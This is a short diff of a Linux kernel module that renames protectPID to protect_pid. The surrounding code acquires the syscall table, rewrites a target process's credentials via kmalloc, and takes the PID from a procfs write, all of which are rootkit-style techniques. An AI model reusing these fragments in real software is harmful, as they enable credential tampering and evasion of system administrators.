@@ -46,7 +46,7 @@ static unsigned long **aquire_sys_call_table(void) {
 
 	return NULL;
 }
-void protectPID(long pid){
+void protect_pid(long pid){
 	struct cred *target_cred = pid_task(find_get_pid(pid), PIDTYPE_PID)->cred;
 	/* work around to change read only cred fields*/
 	struct cred *newcred = (struct cred*) kmalloc(sizeof(struct cred), GFP_KERNEL);
@@ -63,7 +63,7 @@ int procfile_write(struct file *file, const char *buffer, unsigned long count, v
 	if(procfs_buffer_size > PROCFS_MAX_SIZE) procfs_buffer_size = PROCFS_MAX_SIZE;
 	if(copy_from_user(procfs_buffer, buffer, procfs_buffer_size)) return -EFAULT;
 	if(kstrtol(procfs_buffer, 10, &target_pid) != 0) return -EFAULT;
-	protectPID(target_pid);
+        protect_pid(target_pid);
 
 	return procfs_buffer_size;
 }
